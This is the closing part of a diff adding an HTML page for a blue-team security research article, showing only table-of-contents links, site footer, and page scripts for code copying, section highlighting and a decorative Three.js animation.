+    <li class="toc-h3"><a href="#kql-queries">KQL Queries</a></li>
+    <li class="toc-h3"><a href="#sigma-rule">Sigma Rule</a></li>
+    <li><a href="#defense-philosophy">10. Defense Philosophy</a></li>
+    <li><a href="#detection-coverage">11. Detection Coverage</a></li>
+    <li><a href="#mitre-mapping">12. MITRE ATT&amp;CK Mapping</a></li>
+    <li><a href="#conclusion">13. Conclusion</a></li>
+  </ul>
+
+  <div class="sidebar-meta">
+    <div class="meta-item"><i class="bi bi-person"></i> QA210</div>
+    <div class="meta-item"><i class="bi bi-calendar3"></i> 2026</div>
+    <div class="meta-item"><i class="bi bi-clock"></i> ~45 min read</div>
+    <div class="meta-item"><i class="bi bi-tag"></i> Blue Team Research</div>
+  </div>
+</aside>
+
+</div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-left">&copy; 2026 <span>QA210</span> &mdash; Security Research &amp; CTF Writeups</div>
+    <div class="footer-links">
+      <a href="/">Home</a>
+      <a href="/htb/">Hack The Box</a>
+      <a href="/tjctf/">TJCTF</a>
+      <a href="/thm/">TryHackMe</a>
+      <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+      <a href="https://w4llz.me/" target="_blank">W4LLZ</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+// Copy button
+function copyCode(btn){
+  const code=btn.closest('.code-block').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';
+    setTimeout(()=>{btn.textContent='Copy';btn.style.color='';btn.style.borderColor='';},2000);
+  });
+}
+
+// Active TOC tracking
+const tocLinks=document.querySelectorAll('.toc-list a');
+const sections=[];
+tocLinks.forEach(link=>{
+  const id=link.getAttribute('href').substring(1);
+  const el=document.getElementById(id);
+  if(el)sections.push({el,link});
+});
+function updateTOC(){
+  let current=sections[0];
+  for(const s of sections){if(s.el.getBoundingClientRect().top<=120)current=s}
+  tocLinks.forEach(l=>l.classList.remove('active'));
+  if(current)current.link.classList.add('active');
+}
+window.addEventListener('scroll',updateTOC,{passive:true});
+updateTOC();
+
+// Three.js — Network graph for research
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:false});
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,1.5));
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  camera.position.z=5;
+
+  const g=new THREE.Group();scene.add(g);
+
+  // Dodecahedron wireframe
+  const dodec=new THREE.DodecahedronGeometry(2.2,0);
+  const dMat=new THREE.MeshBasicMaterial({color:0xa855f7,wireframe:true,transparent:true,opacity:0.08});
+  g.add(new THREE.Mesh(dodec,dMat));
+
+  // Inner icosahedron
+  const ico=new THREE.IcosahedronGeometry(1.4,0);
+  const iMat=new THREE.MeshBasicMaterial({color:0xf43f5e,wireframe:true,transparent:true,opacity:0.06});
+  g.add(new THREE.Mesh(ico,iMat));
+
+  // Particles
+  const pCount=600;const pGeo=new THREE.BufferGeometry();
+  const pos=new Float32Array(pCount*3);const vel=[];
+  for(let i=0;i<pCount;i++){pos[i*3]=(Math.random()-.5)*20;pos[i*3+1]=(Math.random()-.5)*20;pos[i*3+2]=(Math.random()-.5)*10;vel.push(Math.random()*.006+.002)}
+  pGeo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  const pMat=new THREE.PointsMaterial({color:0xa855f7,size:0.02,transparent:true,opacity:0.25});
+  scene.add(new THREE.Points(pGeo,pMat));
+
+  function animate(){
+    requestAnimationFrame(animate);
+    g.rotation.y+=0.0015;g.rotation.x+=0.0008;
+    const p=pGeo.attributes.position.array;
+    for(let i=0;i<pCount;i++){p[i*3+1]-=vel[i];if(p[i*3+1]<-10){p[i*3+1]=10;p[i*3]=(Math.random()-.5)*20}}
+    pGeo.attributes.position.needsUpdate=true;
+    renderer.render(scene,camera);
+  }
+  animate();
+  window.addEventListener('resize',()=>{camera.aspect=innerWidth/innerHeight;camera.updateProjectionMatrix();renderer.setSize(innerWidth,innerHeight)});
+})();
+</script>
+</body>
+</html>
